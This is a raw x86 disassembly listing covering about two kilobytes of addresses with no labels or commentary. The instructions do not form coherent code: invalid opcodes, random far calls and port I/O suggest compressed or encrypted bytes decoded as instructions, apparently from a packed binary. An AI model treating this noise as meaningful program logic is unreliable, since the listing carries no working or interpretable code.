  4172d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172d5:	push   0xffffff98
  4172d7:	inc    esp
  4172d8:	popf   
  4172d9:	xlat   BYTE PTR ds:[ebx]
  4172da:	sub    eax,0xa85eb53a
  4172df:	imul   edi,DWORD PTR [esi+0x25975eb6],0x9edb2cf4
  4172e9:	loop   0x417344
  4172eb:	jns    0x4172c8
  4172ed:	mov    ebp,0x5c2edb6
  4172f2:	or     al,0x92
  4172f4:	icebp  
  4172f5:	cmp    cl,bh
  4172f7:	push   ecx
  4172f8:	(bad)  [ecx+ebp*8+0x40951333]
  4172ff:	stos   DWORD PTR es:[edi],eax
  417300:	ss pop ecx
  417302:	leave  
  417303:	xor    bl,dl
  417305:	stos   DWORD PTR es:[edi],eax
  417306:	(bad)  
  417307:	push   0x5b7b1363
  41730c:	scas   eax,DWORD PTR es:[edi]
  41730d:	xlat   BYTE PTR ds:[ebx]
  41730e:	mov    edi,0xb6575d9e
  417313:	lock cwde 
  417315:	jns    0x417371
  417317:	and    BYTE PTR [ecx+0x635d2096],ch
  41731d:	das    
  41731e:	mov    ch,0x66
  417320:	mov    al,ds:0x34d957f0
  417325:	dec    edi
  417326:	and    al,0xfb
  417328:	add    dl,0x47
  41732b:	out    0x6a,al
  41732d:	add    al,0x21
  41732f:	ss stos DWORD PTR es:[edi],eax
  417331:	pop    ebp
  417332:	sub    dl,BYTE PTR [esi+0x4c]
  417335:	cmp    ah,BYTE PTR [edi+ecx*4]
  417338:	and    eax,DWORD PTR [ecx+ebp*4-0x4b052db2]
  41733f:	mov    dh,0xb2
  417341:	push   ss
  417342:	outs   dx,BYTE PTR ds:[esi]
  417343:	jmp    0x4172cf
  417345:	icebp  
  417346:	push   ebx
  417347:	push   edi
  417348:	inc    ebp
  417349:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41734a:	add    cl,BYTE PTR [esi]
  41734c:	ins    DWORD PTR es:[edi],dx
  41734d:	mov    es,WORD PTR ds:[esi+eiz*1]
  417351:	stc    
  417352:	dec    ecx
  417353:	sbb    al,0x79
  417355:	mov    ch,0xe6
  417357:	das    
  417358:	xchg   ecx,eax
  417359:	cdq    
  41735a:	(bad)  
  41735b:	not    DWORD PTR ds:0x1897b8ee
  417361:	jnp    0x417335
  417363:	xchg   DWORD PTR [ebx+eiz*8],ecx
  417366:	clc    
  417367:	in     al,dx
  417368:	dec    ecx
  417369:	(bad)
  41736c:	call   0x91e3:0xec840448
  417373:	pushf  
  417374:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417375:	sub    ecx,ecx
  417377:	or     eax,0x70313f2f
  41737c:	cmc    
  41737d:	jl     0x41737f
  41737f:	and    al,0x5e
  417381:	mov    ah,0x93
  417383:	sub    bh,BYTE PTR [edi-0x1]
  417386:	aas    
  417387:	push   esp
  417388:	leave  
  417389:	cli    
  41738a:	call   0x5b443fa7
  41738f:	jno    0x41740e
  417391:	jne    0x41740b
  417393:	neg    BYTE PTR [edi]
  417395:	aam    0xe6
  417397:	inc    eax
  417398:	inc    edx
  417399:	(bad)  
  41739a:	pusha  
  41739b:	jmp    0x64a47ad4
  4173a0:	arpl   WORD PTR [esi-0x65853d4b],cx
  4173a6:	jbe    0x4173a2
  4173a8:	mov    ecx,0xbc64d0c2
  4173ad:	cmp    ah,0x5c
  4173b0:	push   ebp
  4173b1:	pop    ecx
  4173b2:	jns    0x417373
  4173b4:	pop    ds
  4173b5:	fwait
  4173b6:	jl     0x417358
  4173b8:	sti    
  4173b9:	rcl    DWORD PTR ds:0x3021e258,1
  4173bf:	iret   
  4173c0:	push   ebx
  4173c1:	inc    eax
  4173c2:	leave  
  4173c3:	cld    
  4173c4:	push   edx
  4173c5:	push   ecx
  4173c6:	clc    
  4173c7:	xlat   BYTE PTR ds:[ebx]
  4173c8:	xor    eax,0x316d32d2
  4173cd:	imul   edi,eax,0xffffffdf
  4173d0:	stc    
  4173d1:	outs   dx,DWORD PTR ds:[esi]
  4173d2:	sub    ecx,DWORD PTR [ecx]
  4173d4:	mov    bh,BYTE PTR ds:0xa0b363cf
  4173da:	mov    esi,0xf69edd07
  4173df:	jns    0x4173c1
  4173e1:	les    ebx,FWORD PTR [edi]
  4173e3:	push   es
  4173e4:	dec    edx
  4173e5:	adc    eax,0x2e612d7c
  4173ea:	fs out dx,al
  4173ec:	jmp    0xc7c4:0xbfe5fe07
  4173f3:	fcomp  DWORD PTR [eax]
  4173f5:	call   0x1073:0xbab9cd24
  4173fc:	int3   
  4173fd:	mov    ebx,0x1e0b5c32
  417402:	pop    ecx
  417403:	in     eax,dx
  417404:	cmp    al,0x1
  417406:	aas    
  417407:	pop    edx
  417408:	sbb    eax,0x7a113dee
  41740d:	adc    eax,0xab847227
  417412:	sar    BYTE PTR [ecx+0x5711f65d],cl
  417418:	xchg   esi,eax
  417419:	pop    eax
  41741a:	lock shl DWORD PTR [ecx+0x28fb6823],0xc4
  417422:	mov    bl,BYTE PTR [esi-0x50]
  417425:	fwait
  417426:	adc    BYTE PTR [ecx+eax*4],0xc0
  41742a:	mov    esi,edx
  41742c:	add    al,0xb
  41742e:	cmp    ecx,DWORD PTR [ecx]
  417430:	repz and eax,0xa1ac172
  417436:	lods   al,BYTE PTR ds:[esi]
  417437:	inc    esp
  417438:	scas   al,BYTE PTR es:[edi]
  417439:	mov    eax,0x5004182b
  41743e:	ins    BYTE PTR es:[edi],dx
  41743f:	std    
  417440:	or     esp,DWORD PTR [esi-0x7d34c665]
  417446:	mov    dl,0xce
  417448:	cs repnz push ebp
  41744b:	push   eax
  41744c:	ss or  eax,0x1ab7a636
  417452:	or     dl,BYTE PTR [edx]
  417454:	out    dx,al
  417455:	pop    ss
  417456:	popf   
  417457:	jns    0x41744e
  417459:	ss mov bl,0x25
  41745c:	call   0x3249:0x66238f5c
  417463:	xor    eax,0x9d777542
  417468:	or     al,0x19
  41746a:	popa   
  41746b:	jl     0x4173fe
  41746d:	xor    eax,0x28f8b91
  417472:	xor    al,0x5e
  417474:	mov    dl,0xc2
  417476:	(bad)  [ebp-0x33]
  417479:	mov    ah,0x67
  41747b:	dec    esp
  41747c:	jne    0x41745e
  41747e:	or     bh,dh
  417480:	hlt    
  417481:	es repnz push esp
  417484:	ins    BYTE PTR es:[edi],dx
  417485:	cwde   
  417486:	or     eax,0x7a81c641
  41748b:	nop
  41748c:	mov    ds:0xe2468185,eax
  417491:	or     BYTE PTR [edi-0x65],bl
  417494:	jmp    0xe620303c
  417499:	stos   DWORD PTR es:[edi],eax
  41749a:	sub    DWORD PTR [edx+0xb712ef6],ecx
  4174a0:	inc    eax
  4174a1:	es mov eax,0xc013d26
  4174a7:	cld    
  4174a8:	mov    ds:0xb9dc5a5a,al
  4174ad:	xor    al,0x75
  4174af:	jnp    0x41743e
  4174b1:	xlat   BYTE PTR ds:[ebx]
  4174b2:	(bad)  [edi]
  4174b4:	lods   eax,DWORD PTR ds:[esi]
  4174b5:	into   
  4174b6:	adc    dl,ah
  4174b8:	sub    al,0x28
  4174ba:	std    
  4174bb:	mov    ebp,cs
  4174bd:	fwait
  4174be:	pop    ss
  4174bf:	repz ficomp WORD PTR [ebx]
  4174c2:	push   esi
  4174c3:	dec    eax
  4174c4:	retf   
  4174c5:	fnstcw WORD PTR [ebp+0x6d54494d]
  4174cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4174cc:	push   esi
  4174cd:	dec    ebx
  4174ce:	xchg   BYTE PTR [edx-0x4f3f36fb],ch
  4174d4:	inc    esi
  4174d5:	jbe    0x417478
  4174d7:	add    DWORD PTR [ebp+ebx*2-0x7c0fa6d5],0x77
  4174df:	lea    esi,[edi]
  4174e1:	les    ebx,FWORD PTR [edx-0x13]
  4174e4:	test   eax,0xa7e5ec4f
  4174e9:	inc    edx
  4174ea:	mov    DWORD PTR [eax-0x638b9f9f],ebx
  4174f0:	rcl    edx,1
  4174f2:	push   ecx
  4174f3:	sub    al,0xdb
  4174f5:	lock stos DWORD PTR es:[edi],eax
  4174f7:	inc    edx
  4174f8:	rol    BYTE PTR [edx+0x34ee2e0],1
  4174fe:	out    dx,al
  4174ff:	adc    al,0x25
  417501:	jl     0x417512
  417503:	dec    edi
  417504:	retf   
  417505:	add    BYTE PTR [esi],ch
  417507:	mov    edx,0x4d616483
  41750c:	pop    eax
  41750d:	pushf  
  41750e:	mov    ds:0x54c0f54f,eax
  417513:	stos   BYTE PTR es:[edi],al
  417514:	adc    BYTE PTR [ecx+edx*1],0x49
  417518:	mov    esp,0x6ca6e511
  41751d:	push   cs
  41751e:	jno    0x417534
  417520:	push   eax
  417521:	mov    cl,0x63
  417523:	push   0xdb759dd5
  417528:	mov    dh,0x15
  41752a:	fwait
  41752b:	mov    bl,dl
  41752d:	enter  0x6760,0x38
  417531:	mov    ecx,DWORD PTR [edi+ebx*4-0x14acaef1]
  417538:	add    BYTE PTR [edx],cl
  41753a:	inc    ebx
  41753b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41753c:	mov    esi,DWORD PTR [esi-0x70]
  41753f:	stos   BYTE PTR es:[edi],al
  417540:	lods   eax,DWORD PTR ds:[esi]
  417541:	shl    DWORD PTR [edx+ebp*8],cl
  417544:	ficomp DWORD PTR [ecx+0x7d52e78c]
  41754a:	xor    dh,BYTE PTR [eax+0x473c7d31]
  417550:	clc    
  417551:	push   edi
  417552:	adc    DWORD PTR [esi-0x75],esi
  417555:	sub    cl,BYTE PTR [edx]
  417557:	fild   WORD PTR ds:0x5f0008be
  41755d:	sbb    esp,edx
  41755f:	mov    ch,0xba
  417561:	and    bh,bh
  417563:	(bad)  
  417564:	js     0x4174e6
  417566:	and    eax,0x1c57a84b
  41756b:	push   edi
  41756c:	jns    0x4175dd
  41756e:	add    eax,DWORD PTR [ecx+0x34c60ff8]
  417574:	mov    ebx,DWORD PTR [ebx+0x503e5acc]
  41757a:	(bad)  
  41757b:	cmp    al,0x66
  41757d:	sbb    al,0x52
  41757f:	idiv   DWORD PTR [ebx-0x3c]
  417582:	and    DWORD PTR [edi],ebx
  417584:	mov    eax,0x31fc98b6
  417589:	mov    ch,0xda
  41758b:	adc    ebx,DWORD PTR [edi-0x69]
  41758e:	jecxz  0x417536
  417590:	xor    al,dh
  417592:	ins    DWORD PTR es:[edi],dx
  417593:	xlat   BYTE PTR ds:[ebx]
  417594:	push   ss
  417595:	mov    dh,BYTE PTR [edx+0x37]
  417598:	(bad)  
  417599:	pop    ebx
  41759a:	and    esp,DWORD PTR [eax-0x2b]
  41759d:	dec    esp
  41759e:	imul   BYTE PTR [ebx+0x1b]
  4175a1:	clc    
  4175a2:	jno    0x417591
  4175a4:	sti    
  4175a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4175a6:	imul   edi,DWORD PTR [ebp+0x112ef8a1],0xffffffbb
  4175ad:	dec    ebx
  4175ae:	neg    DWORD PTR [edx-0x64]
  4175b1:	sub    al,0x13
  4175b3:	add    ebp,DWORD PTR [ebx]
  4175b5:	cmp    cl,cl
  4175b7:	pop    ecx
  4175b8:	pop    ss
  4175b9:	aaa    
  4175ba:	dec    DWORD PTR [ecx+0x5f]
  4175bd:	sub    eax,DWORD PTR [ebx+0x60]
  4175c0:	pop    eax
  4175c1:	mov    bh,0x71
  4175c3:	cmp    BYTE PTR ds:0x991f3fc3,ch
  4175c9:	fmul   QWORD PTR [edi]
  4175cb:	push   edx
  4175cc:	mov    bh,0x64
  4175ce:	push   esi
  4175cf:	push   es
  4175d0:	push   esp
  4175d1:	inc    edi
  4175d2:	and    eax,0x4c5298f6
  4175d7:	mov    esp,0xcdf61614
  4175dc:	xchg   edi,eax
  4175dd:	mov    eax,ds:0x470cc57
  4175e2:	cdq    
  4175e3:	stc    
  4175e4:	lock ss idiv eax
  4175e8:	add    eax,0xc497bb81
  4175ed:	and    bh,bh
  4175ef:	push   ss
  4175f0:	dec    ebx
  4175f1:	pop    ds
  4175f2:	rcl    DWORD PTR [edi+esi*1+0x36],0x85
  4175f7:	ja     0x4175ec
  4175f9:	gs push 0x9a2d96f7
  4175ff:	push   ds
  417600:	pop    ebx
  417601:	add    cl,BYTE PTR ds:0x2383ba91
  417607:	inc    esi
  417608:	dec    ebx
  417609:	inc    eax
  41760a:	mov    cl,0x1c
  41760c:	sbb    al,0xd5
  41760e:	aas    
  41760f:	(bad)  
  417610:	push   0x8
  417612:	jge    0x4175db
  417614:	cli    
  417615:	out    0x95,al
  417617:	dec    edi
  417618:	pop    esi
  417619:	cdq    
  41761a:	fdivr  QWORD PTR [eax+0x61]
  41761d:	scas   eax,DWORD PTR es:[edi]
  41761e:	fsub   DWORD PTR ds:0xa7015945
  417624:	mov    cl,0x24
  417626:	xor    bh,dl
  417628:	dec    eax
  417629:	loop   0x4175ce
  41762b:	nop
  41762c:	adc    DWORD PTR [esi-0x10e934ae],ebp
  417632:	jecxz  0x417686
  417634:	nop
  417635:	test   DWORD PTR [ebx+0x2e],ebx
  417638:	inc    esp
  417639:	or     bl,BYTE PTR [ebx-0x23]
  41763c:	cmp    al,0x6f
  41763e:	or     al,0xf2
  417640:	mov    dh,0x7d
  417642:	mov    al,ds:0xea77762f
  417647:	(bad)  
  417648:	js     0x417665
  41764a:	pushf  
  41764b:	pcmpeqw mm6,mm6
  41764e:	push   ebx
  41764f:	sbb    DWORD PTR [ebp-0x2a],ebp
  417652:	sbb    ch,BYTE PTR [eax+0x1f76f27c]
  417658:	sub    al,0x22
  41765a:	in     eax,0xa9
  41765c:	adc    esp,edx
  41765e:	int    0x93
  417660:	dec    edi
  417661:	adc    edx,edx
  417663:	sub    eax,0xfe59b110
  417668:	jg     0x417643
  41766a:	inc    esi
  41766b:	and    al,0x90
  41766d:	mov    cl,0xf
  41766f:	jb     0x417647
  417671:	cdq    
  417672:	add    al,BYTE PTR [esi-0xf5bacca]
  417678:	retf   
  417679:	and    cl,ah
  41767b:	into   
  41767c:	cmp    DWORD PTR [edx],edi
  41767e:	cmp    edx,0x49
  417681:	inc    edx
  417682:	(bad)  
  417683:	leave  
  417684:	les    ebx,FWORD PTR [eax-0x43]
  417687:	icebp  
  417688:	imul   eax,DWORD PTR [eax-0x47],0x5a26535b
  41768f:	retf   
  417690:	jle    0x4176a2
  417692:	stc    
  417693:	pop    ecx
  417694:	aad    0xf3
  417696:	inc    ebp
  417697:	daa    
  417698:	mov    edx,DWORD PTR [edi-0x3c2edf78]
  41769e:	nop
  41769f:	sbb    al,0x36
  4176a1:	and    edi,DWORD PTR [esi]
  4176a3:	mov    esi,0x6dc22a5a
  4176a8:	sbb    al,0xb7
  4176aa:	les    edx,FWORD PTR [edx+eiz*2-0x369a444]
  4176b1:	sti    
  4176b2:	push   ss
  4176b3:	mov    al,ds:0x22cf4ddf
  4176b8:	cmp    ebp,ecx
  4176ba:	and    BYTE PTR [eax-0x6ca1987a],dh
  4176c0:	push   esi
  4176c1:	fist   WORD PTR [edi]
  4176c3:	(bad)  
  4176c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4176c5:	(bad)  
  4176c6:	neg    DWORD PTR [ebx+0x424943c5]
  4176cc:	jle    0x4176f5
  4176ce:	ins    BYTE PTR es:[edi],dx
  4176cf:	inc    ebp
  4176d0:	sbb    al,0xf3
  4176d2:	std    
  4176d3:	sbb    al,0x50
  4176d5:	adc    ah,ch
  4176d7:	jbe    0x41772a
  4176d9:	cmp    ah,cl
  4176db:	and    DWORD PTR [ebp+0x242934da],eax
  4176e1:	mov    eax,DWORD PTR [ecx-0x21abaae5]
  4176e7:	sbb    DWORD PTR [ebx+0x18],0x3f021362
  4176ee:	sub    BYTE PTR [edx+edi*8],dh
  4176f1:	mov    dh,0xb4
  4176f3:	dec    ebp
  4176f4:	and    eax,0xc740707d
  4176f9:	iret   
  4176fa:	xchg   ecx,eax
  4176fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4176fc:	shl    BYTE PTR [edi-0x11],1
  4176ff:	push   0xffffffa4
  417701:	mov    eax,ds:0xe413ddc4
  417706:	call   0x7716:0x4d046e79
  41770d:	xlat   BYTE PTR ds:[ebx]
  41770e:	mov    esi,0x6cbe2810
  417713:	lea    edx,[edx]
  417715:	shr    DWORD PTR [edx-0x4c],0xc5
  417719:	retf   0x656f
  41771c:	retf   0x4f32
  41771f:	fcmovnbe st,st(7)
  417721:	int3   
  417722:	lods   al,BYTE PTR ds:[esi]
  417723:	cmp    cl,BYTE PTR [edx-0x4e]
  417726:	inc    esp
  417727:	jmp    FWORD PTR [ebp+0x53]
  41772a:	(bad)  
  41772b:	inc    edx
  41772c:	lea    edx,[ecx-0x2876d872]
  417732:	out    0x93,al
  417734:	pop    ds
  417735:	jo     0x41776f
  417737:	mov    ah,0x2b
  417739:	or     ecx,eax
  41773b:	jae    0x41774d
  41773d:	sub    bh,BYTE PTR [edx-0xcb66766]
  417743:	repnz sub edx,esp
  417746:	mov    al,0x38
  417748:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417749:	test   al,0x4a
  41774b:	lds    ecx,FWORD PTR [esi+eax*8+0x2aaedadf]
  417752:	arpl   WORD PTR [edi],sp
  417754:	mov    WORD PTR [eax-0xc37c64a],ds
  41775a:	mov    ecx,0xe2791861
  41775f:	iret   
  417760:	pop    edx
  417761:	cmp    DWORD PTR [edx-0x66],ebx
  417764:	sbb    eax,0xcdc81cae
  417769:	pusha  
  41776a:	push   cs
  41776b:	xor    cl,BYTE PTR [ebx-0x41]
  41776e:	adc    BYTE PTR [ebx-0x4e],dl
  417771:	push   eax
  417772:	adc    BYTE PTR [eax+0x58743d5],ah
  417778:	aas    
  417779:	dec    eax
  41777a:	aas    
  41777b:	or     bl,0x6e
  41777e:	outs   dx,BYTE PTR ds:[esi]
  41777f:	daa    
  417780:	cs jno 0x4177a9
  417783:	dec    edi
  417784:	ror    BYTE PTR [esi],0xf4
  417787:	fsub   st,st(5)
  417789:	pushf  
  41778a:	add    DWORD PTR [edx+ebx*2+0x62],esp
  41778e:	add    dl,BYTE PTR [ebp+0x7772a6aa]
  417794:	daa    
  417795:	fs and al,0xf1
  417798:	adc    dh,BYTE PTR [esi+0x33]
  41779b:	aad    0xf1
  41779d:	pusha  
  41779e:	mov    ds:0xa3b026ad,al
  4177a3:	push   0xcae4d045
  4177a8:	jmp    0xb678cd18
  4177ad:	jp     0x4177eb
  4177af:	clc    
  4177b0:	mov    al,0xcb
  4177b2:	fist   WORD PTR ss:[ecx+edi*8]
  4177b6:	js     0x4177bd
  4177b8:	lahf   
  4177b9:	or     BYTE PTR [esi+0x44],ah
  4177bc:	dec    esi
  4177bd:	test   DWORD PTR [ebx-0x3c],ebp
  4177c0:	in     al,0xef
  4177c2:	xchg   edx,eax
  4177c3:	dec    ebp
  4177c4:	out    0xb4,al
  4177c6:	test   ch,bl
  4177c8:	add    BYTE PTR [ecx+0x495b9899],bh
  4177ce:	cs xchg esi,eax
  4177d0:	jno    0x417771
  4177d2:	pop    ecx
  4177d3:	les    edi,FWORD PTR [edx+0x673e85ba]
  4177d9:	ja     0x4177f5
  4177db:	sub    ch,BYTE PTR es:[ecx-0x772d0789]
  4177e2:	outs   dx,DWORD PTR ds:[esi]
  4177e3:	frstor [esi+ebx*8+0x2ecad33e]
  4177ea:	rcr    BYTE PTR [ecx-0x47],cl
  4177ed:	out    0xe4,eax
  4177ef:	adc    bl,BYTE PTR [ebp-0x65]
  4177f2:	cmp    BYTE PTR [ecx],ah
  4177f4:	out    dx,eax
  4177f5:	mov    DWORD PTR [esi+0xd27cc1c],esp
  4177fb:	dec    esp
  4177fc:	cmp    ebx,esp
  4177fe:	cmp    bh,BYTE PTR [ebp+0x1e8124f7]
  417804:	popa   
  417805:	aam    0x9b
  417807:	mov    bl,0xd9
  417809:	gs mov ebx,0xc2dc6b43
  41780f:	sbb    eax,0xc6874a3e
  417814:	rcr    BYTE PTR [edx-0x61],0x6b
  417818:	loopne 0x41787c
  41781a:	dec    eax
  41781b:	and    al,BYTE PTR [eax]
  41781d:	jne    0x417831
  41781f:	mov    ds:0xea5f3563,al
  417824:	aas    
  417825:	fwait
  417826:	cld    
  417827:	inc    edx
  417828:	lods   eax,DWORD PTR ds:[esi]
  417829:	inc    eax
  41782a:	jmp    0x4177ca
  41782c:	and    edx,eax
  41782e:	aad    0xab
  417830:	jbe    0x417824
  417832:	fdivr  DWORD PTR [esp+esi*8]
  417835:	mov    esi,0xa80cc909
  41783a:	add    eax,0x4bc4a50
  41783f:	call   0xbe66:0x72432f29
  417846:	js     0x417820
  417848:	imul   edi,edx,0xf58141f
  41784e:	mov    ds:0xd3b63e16,eax
  417853:	xchg   ecx,eax
  417854:	inc    ebp
  417855:	jle    0x4177fb
  417857:	jecxz  0x41789c
  417859:	mov    al,ds:0x7b826c3f
  41785e:	lock mov edi,0x79e899d7
  417864:	(bad)  
  417865:	jns    0x417812
  417867:	shl    BYTE PTR [eax+0x457e3f3f],0xe3
  41786e:	xor    edx,DWORD PTR [edi]
  417870:	les    ebp,FWORD PTR ds:[esi]
  417873:	mov    bl,0x26
  417875:	sbb    DWORD PTR [edi-0x16],edi
  417878:	adc    bh,al
  41787a:	sub    eax,0x2cbd97f9
  41787f:	out    0xee,al
  417881:	mov    eax,ds:0x6bb2e7cd
  417886:	je     0x4178f6
  417888:	fld    TBYTE PTR [eax+0x63a4f9aa]
  41788e:	pop    esi
  41788f:	mov    BYTE PTR [esp+ebp*8-0xc],dh
  417893:	cmp    ch,BYTE PTR [ebx+0x3c]
  417896:	dec    eax
  417897:	jae    0x41783b
  417899:	fidiv  WORD PTR [ecx+0x48]
  41789c:	dec    ebp
  41789d:	xchg   ecx,eax
  41789e:	sub    ah,BYTE PTR [edx+0xa]
  4178a1:	sbb    al,0x8f
  4178a3:	(bad)  
  4178a4:	xor    bh,BYTE PTR [ebx]
  4178a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4178a7:	mov    dh,0x68
  4178a9:	pop    esi
  4178aa:	or     ah,dl
  4178ac:	cmp    bl,bh
  4178ae:	icebp  
  4178af:	in     eax,dx
  4178b0:	dec    esi
  4178b1:	jb     0x41785e
  4178b3:	mov    BYTE PTR [edi+0x76],cl
  4178b6:	and    al,0x6b
  4178b8:	shl    DWORD PTR [eax],1
  4178ba:	retf   0xd0fc
  4178bd:	sbb    ah,BYTE PTR [eax+0x3]
  4178c0:	xchg   edx,eax
  4178c1:	(bad)  
  4178c2:	mov    edi,0xb8b913a3
  4178c7:	popa   
  4178c8:	aaa    
  4178c9:	xchg   BYTE PTR ds:0x98cc5d6a,ch
  4178cf:	dec    ebx
  4178d0:	loop   0x41786c
  4178d2:	scas   eax,DWORD PTR es:[edi]
  4178d3:	scas   al,BYTE PTR es:[edi]
  4178d4:	mov    dh,0xd4
  4178d6:	inc    esi
  4178d7:	aam    0x45
  4178d9:	ret    
  4178da:	call   0x995a:0xba15d07c
  4178e1:	add    DWORD PTR [ebx],0xba0c14
  4178e7:	pop    ebp
  4178e8:	ja     0x417906
  4178ea:	adc    eax,0x67876ae8
  4178ef:	jnp    0x4178f5
  4178f1:	xchg   DWORD PTR [edi-0x18bb5f62],ebx
  4178f7:	outs   dx,BYTE PTR ds:[esi]
  4178f8:	cwde   
  4178f9:	fld    st(3)
  4178fb:	mov    BYTE PTR [edx],dl
  4178fd:	rol    BYTE PTR ds:0xd5e102f1,0x9e
  417904:	xchg   edi,eax
  417905:	js     0x4178ca
  417907:	xchg   esi,eax
  417908:	pop    ebx
  417909:	in     al,dx
  41790a:	xchg   DWORD PTR [eax-0x39c0daed],eax
  417910:	ret    0x392f
  417913:	push   eax
  417914:	jbe    0x417983
  417916:	dec    esp
  417917:	cs sbb eax,edi
  41791a:	les    ebp,FWORD PTR [eax-0x2f]
  41791d:	in     eax,dx
  41791e:	fistp  QWORD PTR [ebx]
  417920:	lahf   
  417921:	and    eax,0x7527c5c
  417926:	fs sbb eax,0xd31b85aa
  41792c:	xor    DWORD PTR [ebx-0x7a],ecx
  41792f:	xor    eax,0x72707253
  417934:	pop    ebx
  417935:	jp     0x4178d7
  417937:	jmp    0x5bcfe5b8
  41793c:	cmc    
  41793d:	test   BYTE PTR [ebp+0x70],dh
  417940:	and    al,0x1c
  417942:	gs pop esp
  417944:	or     DWORD PTR [eax+0x55582765],eax
  41794a:	inc    BYTE PTR [edi-0x5b6238b9]
  417950:	(bad)
  417954:	and    esi,esi
  417956:	cld    
  417957:	adc    DWORD PTR [edi+0x3da6968d],ebp
  41795d:	rcl    BYTE PTR [edx],cl
  41795f:	and    al,0x33
  417961:	pop    ecx
  417962:	inc    edi
  417963:	xchg   BYTE PTR [esi-0x21376e2f],dh
  417969:	and    DWORD PTR [ecx-0x61283fd6],ebx
  41796f:	in     al,0x20
  417971:	aaa    
  417972:	mov    eax,0xcb832f41
  417977:	cmp    DWORD PTR [esp+ebx*1-0x7ef7758e],0xffffffc6
  41797f:	stos   DWORD PTR es:[edi],eax
  417980:	rcr    BYTE PTR [esi+0x39d55acd],cl
  417986:	rol    bh,1
  417988:	adc    BYTE PTR [esi-0x2f],dh
  41798b:	repz mov bl,BYTE PTR [esi+0x88c4f9d]
  417992:	pop    ds
  417993:	ins    BYTE PTR es:[edi],dx
  417994:	inc    edx
  417995:	mov    bl,0xcb
  417997:	out    0x70,eax
  417999:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41799a:	hlt    
  41799b:	jns    0x417976
  41799d:	test   BYTE PTR [edx-0x26cf466f],bl
  4179a3:	data16 in al,dx
  4179a5:	xor    BYTE PTR [eax+0x74],ch
  4179a8:	adc    BYTE PTR [edi+0x7a2ff7db],ah
  4179ae:	xor    eax,0x3c3c167b
  4179b3:	rcl    BYTE PTR [ebx-0x1e],1
  4179b6:	mov    eax,DWORD PTR [ebp+0x6fd5a43d]
  4179bc:	pop    esp
  4179bd:	daa    
  4179be:	iret   
  4179bf:	(bad)  
  4179c0:	(bad)  
  4179c1:	mov    bl,0x30
  4179c3:	push   edx
  4179c4:	cmp    eax,0xcb953f3e
  4179c9:	repz test esp,edx
  4179cc:	lds    eax,FWORD PTR [eax+0x1b3f21c0]
  4179d2:	cmp    eax,0x2a36ec64
  4179d7:	jp     0x417960
  4179d9:	icebp  
  4179da:	call   DWORD PTR [edi]
  4179dc:	xchg   esp,eax
  4179dd:	popa   
  4179de:	bound  ecx,QWORD PTR [ebp-0x6e5d5bae]
  4179e4:	fild   QWORD PTR [edx]
  4179e6:	and    DWORD PTR [edi],ecx
  4179e8:	cmp    DWORD PTR [ecx+ebx*1-0x6eb73551],ebx
  4179ef:	out    0x17,al
  4179f1:	test   al,0x54
  4179f3:	jno    0x417a12
  4179f5:	loopne 0x417998
  4179f7:	outs   dx,DWORD PTR ds:[esi]
  4179f8:	add    esp,DWORD PTR [ebx]
  4179fa:	and    al,0x80
  4179fc:	pop    ecx
  4179fd:	test   DWORD PTR [ecx],ebx
  4179ff:	sub    dh,cl
  417a01:	shl    eax,1
  417a03:	xchg   edx,eax
  417a04:	(bad)  
  417a05:	bnd js 0x4179ed
  417a08:	out    dx,al
  417a09:	mov    cl,0xd3
  417a0b:	inc    esi
  417a0c:	cli    
  417a0d:	jl     0x417a79
  417a0f:	popa   
  417a10:	shl    bl,cl
  417a12:	and    eax,0x6324e142
  417a17:	push   0xffffffbe
  417a19:	lds    edi,FWORD PTR [esi-0xe]
  417a1c:	in     eax,dx
  417a1d:	inc    eax
  417a1e:	out    dx,eax
  417a1f:	imul   BYTE PTR [edx]
  417a21:	pminsw mm6,QWORD PTR [edx+0x2b]
  417a25:	add    edx,esp
  417a27:	in     al,dx
  417a28:	repnz in al,0x3
  417a2b:	xchg   al,dl
  417a2d:	mov    edi,edi
  417a2f:	loope  0x417a23
  417a31:	xor    edi,DWORD PTR [esi-0x65799dfb]
  417a37:	loop   0x417a82
  417a39:	lea    edi,[ebp+0x5b54fb52]
  417a3f:	push   ebx
  417a40:	lods   eax,DWORD PTR ds:[esi]
  417a41:	imul   eax,DWORD PTR ds:0x40f5fb3c,0xffffff98
  417a48:	lods   eax,DWORD PTR ds:[esi]
  417a49:	jmp    0xc603:0xd4e2ecbf
  417a50:	xchg   edx,eax
  417a51:	es test eax,0x288768d7
  417a57:	mov    al,ds:0x34fed1b9
  417a5c:	adc    eax,0xc8963aee
  417a61:	shl    DWORD PTR [esi+edi*2],1
  417a64:	inc    ebx
  417a65:	ins    BYTE PTR es:[edi],dx
  417a66:	jnp    0x417a17
  417a68:	sbb    eax,0xcc8b70f9
  417a6d:	xchg   ecx,eax
  417a6e:	or     BYTE PTR [eax-0x1a],ah
  417a71:	inc    ecx
  417a72:	sbb    BYTE PTR [ecx],ch
  417a74:	aam    0x3b
  417a76:	jmp    0x57f86960
  417a7b:	add    DWORD PTR [ebx-0x2914fadf],0x4f
  417a82:	icebp  
  417a83:	push   0xf60cfa9c
  417a88:	jb     0x417a6c
  417a8a:	mov    eax,ds:0x866972f8
  417a8f:	xor    BYTE PTR [eax+0x57],al
  417a92:	pop    ds
  417a93:	add    dl,BYTE PTR [edi-0x13665b04]
  417a99:	loopne 0x417a5c
  417a9b:	push   eax
  417a9c:	sbb    eax,0x73cbe96a
  417aa1:	pusha  
  417aa2:	test   DWORD PTR [ecx+0x5652de13],ecx
  417aa8:	jne    0x417aae
  417aaa:	xor    eax,0xd82680c0
  417aaf:	adc    ecx,ebp
  417ab1:	inc    edi
  417ab2:	leave  
  417ab3:	or     al,0x77
  417ab5:	push   ss
  417ab6:	xor    edx,esp
  417ab8:	rcl    BYTE PTR [esi-0xec4717d],0x98
  417abf:	ins    BYTE PTR es:[edi],dx
